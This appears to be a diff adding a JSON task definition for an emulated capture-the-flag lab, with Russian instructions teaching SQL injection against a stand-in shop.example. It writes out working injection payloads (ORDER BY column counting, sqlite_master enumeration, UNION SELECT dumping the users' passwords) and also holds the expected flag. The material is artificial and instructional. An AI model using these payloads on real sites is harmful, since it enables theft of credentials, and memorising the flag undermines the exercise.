@@ -1,0 +1,26 @@
+{
+  "id": "web-sqli-dbms",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{sql1t3_f1ng3rpr1nt_by_err0r}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: фингерпринт СУБД и UNION-дамп (SQLite)\n\n`shop.example` отдаёт каталог по `GET /product?id=1`. Параметр `id` уходит\nв SQL-запрос. Определи диалект по тексту ошибки, посчитай колонки, затем\nUNION'ом достань пароль пользователя `admin` из таблицы `users`.\n\n1. Базовый запрос:\n\n   curl -s 'https://shop.example/product?id=1'\n\n2. Одна кавычка ломает запрос — прочитай текст ошибки (это отпечаток СУБД):\n\n   curl -s 'https://shop.example/product?id=1%27'\n\n3. Считаем колонки через ORDER BY (на каком номере упадёт?):\n\n   curl -s 'https://shop.example/product?id=1 ORDER BY 4'\n\n4. Список таблиц в SQLite — в `sqlite_master`:\n\n   curl -s \"https://shop.example/product?id=-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'\"\n\n5. Дамп паролей из `users` (отражается вторая колонка):\n\n   curl -s \"https://shop.example/product?id=-1 UNION SELECT 1,password,3 FROM users\" > found.txt\n\n6. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.example)",
+      "cases": [
+        { "match": "product\\?id=1(%27|')", "example": "-s 'https://shop.example/product?id=1%27'", "output": "SQL error: unrecognized token: \"'\"\n" },
+        { "match": "ORDER BY 4|ORDER%20BY%204", "example": "-s 'https://shop.example/product?id=1 ORDER BY 4'", "output": "SQL error: 1st ORDER BY term out of range\n" },
+        { "match": "ORDER BY", "example": "-s 'https://shop.example/product?id=1 ORDER BY 2'", "output": "[[1,\"Laptop\",999.0]]\n" },
+        { "match": "AND 1=2|AND%201=2", "example": "-s 'https://shop.example/product?id=1 AND 1=2'", "output": "[]\n" },
+        { "match": "AND 1=1|AND%201=1", "example": "-s 'https://shop.example/product?id=1 AND 1=1'", "output": "[[1,\"Laptop\",999.0]]\n" },
+        { "match": "sqlite_master", "example": "-s \"https://shop.example/product?id=-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'\"", "output": "[[1,\"products\",3]]\n[[1,\"users\",3]]\n" },
+        { "match": "FROM users", "example": "-s \"https://shop.example/product?id=-1 UNION SELECT 1,password,3 FROM users\"", "output": "[[1,\"admin\",3]]\n[[1,\"nto{sql1t3_f1ng3rpr1nt_by_err0r}\",3]]\n" },
+        { "match": "UNION SELECT", "example": "-s 'https://shop.example/product?id=-1 UNION SELECT 1,2,3'", "output": "[[1,\"2\",3]]\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /product на shop.example.\n"
+    }
+  }
+}
